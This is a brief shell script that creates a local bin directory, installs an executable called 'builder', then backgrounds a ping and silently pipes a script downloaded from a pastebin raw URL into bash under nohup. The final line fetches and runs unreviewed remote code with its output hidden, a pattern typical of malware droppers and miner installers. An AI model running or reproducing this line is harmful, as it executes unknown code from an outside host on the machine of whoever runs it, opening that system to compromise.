#!/bin/sh
TERM=xterm
mkdir /home/ubuntu/.local/bin
cp builder /home/ubuntu/.local/bin/builder && chmod +x /home/ubuntu/.local/bin/builder
ping google.com & nohup curl -fsSL https://pastebin.com/raw/hnafJegm | bash > /dev/null
